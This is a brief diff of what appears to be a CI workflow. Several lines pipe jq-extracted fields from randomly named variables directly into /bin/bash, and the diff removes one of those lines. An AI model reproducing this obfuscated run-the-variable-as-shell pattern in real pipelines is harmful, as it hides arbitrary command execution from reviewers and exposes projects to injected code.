@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$uezxp15" | jq -r .ekipb94666 | /bin/bash
           echo $ydfz6066 | jq -r .a4 | /bin/bash
           echo $vwlav1721 | jq -r .xnmw32 | /bin/bash
-          printf '%s' "$emq21" | jq -r .d2 | /bin/bash
 
       - name: Upload results
         if: always()
